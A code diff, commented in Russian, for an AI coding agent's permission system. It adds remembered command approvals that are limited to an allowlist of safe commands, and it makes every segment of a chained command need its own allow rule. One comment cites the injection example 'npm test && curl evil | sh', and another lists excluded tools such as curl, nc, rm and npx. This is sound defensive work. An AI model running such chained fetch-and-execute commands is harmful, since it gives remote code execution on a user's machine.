@@ -18,7 +18,7 @@
  * ask понижает auto→confirm.
  */
 
-import { readFileSync } from 'fs'
+import { readFileSync, writeFileSync, mkdirSync, renameSync } from 'fs'
 import { join } from 'path'
 import { homedir } from 'os'
 import { decide, type AgentMode, type AutoApprove, type ToolDecision } from './mode-policy'
@@ -214,12 +214,118 @@ export function loadPermissionRules(projectPath: string | null): CompiledPermiss
   return merged
 }
 
+// Persistent per-command approvals (Codex prefix_rule). При одобрении команды юзер
+// может «запомнить» её → выводим prefix-паттерн и дописываем в permissions.json как
+// allow-правило. Будущие сессии авто-разрешают (loadPermissionRules подхватит).
+// Ревью HIGH (H2 + ре-ревью): денилист опасных команд/субкоманд протекает по неполноте
+// (первый ревью пропустил npm install/git submodule/kubectl apply/go install/… — все RCE).
+// Инвертируем на ALLOWLIST безопасных для бланкетного allow операций (инспекция/тест/
+// сборка — НЕ fetch-and-exec, НЕ мутация системы). Что НЕ в списке — не запоминаем
+// (команда всё равно выполнится разово по одобрению юзера, просто без персистентного allow).
+// Инструменты-обёртки: запоминаем только известную безопасную субкоманду.
+const SAFE_SUBCOMMANDS: Record<string, Set<string>> = {
+  git: new Set(['status', 'log', 'diff', 'show', 'branch', 'describe', 'blame', 'tag', 'remote', 'rev-parse', 'ls-files', 'ls-remote', 'shortlog', 'reflog', 'whatchanged', 'grep', 'cat-file', 'symbolic-ref', 'name-rev', 'count-objects', 'var', 'check-ignore']),
+  npm: new Set(['test', 'ls', 'list', 'outdated', 'view', 'why', 'ping', 'audit', 'root', 'prefix', 'bin', 'docs', 'help', 'version']),
+  yarn: new Set(['test', 'list', 'why', 'outdated', 'audit', 'info', 'versions', 'help']),
+  pnpm: new Set(['test', 'list', 'why', 'outdated', 'audit', 'root', 'help']),
+  docker: new Set(['ps', 'images', 'logs', 'inspect', 'version', 'info', 'top', 'port', 'diff', 'stats', 'history', 'search']),
+  kubectl: new Set(['get', 'describe', 'logs', 'top', 'version', 'explain', 'api-resources', 'api-versions', 'cluster-info']),
+  cargo: new Set(['build', 'test', 'check', 'tree', 'metadata', 'version', 'fmt', 'clippy', 'bench', 'doc']),
+  go: new Set(['build', 'test', 'vet', 'version', 'env', 'list', 'doc', 'fmt']),
+  pip: new Set(['list', 'show', 'freeze', 'check', 'help']),
+  pip3: new Set(['list', 'show', 'freeze', 'check', 'help']),
+  dotnet: new Set(['build', 'test', 'list']),
+  brew: new Set(['list', 'info', 'outdated', 'deps', 'config', 'doctor']),
+  apt: new Set(['list', 'show', 'search', 'policy'])
+}
+// Безопасные одиночные команды (чтение/инспекция/тест/линт/формат/typecheck/сборка).
+// НЕ включаем: rm/dd/mkfs (деструктив), curl/wget/ssh/nc (сеть-эксфильтрация),
+// bash/sh/python/node/eval (произвольное исполнение), npx (fetch-and-exec), make/mvn/
+// gradle (произвольные таргеты), env/sudo/xargs/find (обёртки/подстановка).
+const SAFE_COMMANDS = new Set([
+  'ls', 'cat', 'head', 'tail', 'grep', 'rg', 'fd', 'wc', 'sort', 'uniq', 'cut', 'tr',
+  'echo', 'pwd', 'whoami', 'hostname', 'date', 'uptime', 'df', 'du', 'free', 'which',
+  'whereis', 'type', 'file', 'stat', 'tree', 'diff', 'cmp', 'true', 'false',
+  'tsc', 'eslint', 'prettier', 'jest', 'vitest', 'mocha', 'pytest', 'tox', 'flake8',
+  'black', 'ruff', 'mypy', 'pylint', 'gofmt', 'rustfmt', 'vite', 'esbuild', 'tsx'
+])
+
+/** Вывести prefix-правило из одобренного вызова. Только для БЕЗОПАСНЫХ операций
+ *  (allowlist) — чтобы бланкетный allow не открыл RCE/деструктив. Возвращает строку
+ *  правила (`Bash(git status:*)`) или null (не запоминаем — re-prompt каждый раз). */
+export function derivePrefixRule(toolName: string, argText: string): string | null {
+  if (toolName === 'run_command' || toolName === 'run_until_green') {
+    const words = argText.trim().split(/\s+/).filter(Boolean)
+    if (!words.length) return null
+    // Канонизируем имя: basename без пути/расширения — иначе `/usr/bin/rm`, `rm.exe`,
+    // `.\curl` обходили бы allowlist по первому слову.
+    const base = words[0].toLowerCase().split(/[/\\]/).pop()!.replace(/\.(exe|cmd|bat|com|ps1)$/, '')
+    const safeSubs = SAFE_SUBCOMMANDS[base]
+    if (safeSubs) {
+      // Инструмент-обёртка: второе слово должно быть настоящей безопасной субкомандой
+      // (не флаг `git -c ...`, не отсутствовать «весь git», не мутация/fetch-exec).
+      if (!words[1] || words[1].startsWith('-')) return null
+      if (!safeSubs.has(words[1].toLowerCase())) return null
+      return `Bash(${words[0]} ${words[1]}:*)`
+    }
+    if (SAFE_COMMANDS.has(base)) return `Bash(${words[0]}:*)`
+    return null // неизвестная/опасная команда — не запоминаем
+  }
+  if (toolName === 'connector_query') {
+    const id = argText.trim()
+    return id ? `connector_query(${id})` : null
+  }
+  return null  // V1: запоминаем только команды/коннекторы (файловые правки — по режиму)
+}
+
+/** Дописать allow-правило в user-scope permissions (~/.verstak/permissions.json).
+ *  Идемпотентно (дубли не плодит). Возвращает true если добавлено, false если уже было. */
+export function rememberApproval(rule: string): boolean {
+  const dir = join(homedir(), '.verstak')
+  const path = join(dir, 'permissions.json')
+  let cfg: { allow?: string[]; deny?: string[]; ask?: string[] } = {}
+  try { cfg = JSON.parse(readFileSync(path, 'utf8')) } catch { /* нет файла — создаём */ }
+  const allow = Array.isArray(cfg.allow) ? cfg.allow : []
+  if (allow.includes(rule)) return false
+  allow.push(rule)
+  cfg.allow = allow
+  try { mkdirSync(dir, { recursive: true }) } catch { /* ignore */ }
+  // Атомарно (ревью M2): temp + rename, чтобы параллельная запись/краш не оставили
+  // усечённый JSON. Идемпотентность (includes выше) отсекает дубли в рамках процесса.
+  const tmp = join(dir, `permissions.${process.pid}.tmp`)
+  writeFileSync(tmp, JSON.stringify(cfg, null, 2), 'utf8')
+  renameSync(tmp, path)
+  return true
+}
+
 function ruleMatches(rules: PermissionRule[], toolName: string, argText: string): PermissionRule | null {
   for (const r of rules) {
     if (r.tool !== toolName) continue
     if (r.argMatcher === null || r.argMatcher(argText)) return r
   }
   return null
+}
+
+const COMMAND_TOOLS = new Set(['run_command', 'run_until_green'])
+
+/**
+ * Ревью HIGH: для ALLOW нужна семантика «покрыт КАЖДЫЙ сегмент» (в отличие от deny/ask,
+ * где `.some` — «сматчил хоть один» — корректно). Иначе allow-правило `Bash(npm test:*)`
+ * авто-одобряло бы `npm test && curl evil | sh` (один безопасный сегмент открывал всю
+ * цепочку). Для команд разбиваем на сегменты и требуем, чтобы каждый был покрыт неким
+ * allow-правилом; для не-команд (пути/коннекторы, не составные) — обычный ruleMatches.
+ */
+function allowMatchesCommand(rules: PermissionRule[], toolName: string, argText: string): PermissionRule | null {
+  if (!COMMAND_TOOLS.has(toolName)) return ruleMatches(rules, toolName, argText)
+  const segs = splitCommandSegments(argText)
+  if (segs.length === 0) return ruleMatches(rules, toolName, argText)
+  let covering: PermissionRule | null = null
+  for (const seg of segs) {
+    const r = rules.find(rr => rr.tool === toolName && (rr.argMatcher === null || rr.argMatcher(seg)))
+    if (!r) return null // сегмент не покрыт ни одним allow → allow не применяется
+    covering = covering ?? r
+  }
+  return covering // все сегменты покрыты
 }
 
 /**
@@ -235,7 +341,7 @@ export function applyPermissionRules(
   if (d) return { decision: 'deny', rule: d }
   const a = ruleMatches(rules.ask, toolName, argText)
   if (a) return { decision: 'ask', rule: a }
-  const al = ruleMatches(rules.allow, toolName, argText)
+  const al = allowMatchesCommand(rules.allow, toolName, argText)
   if (al) return { decision: 'allow', rule: al }
   return null
 }
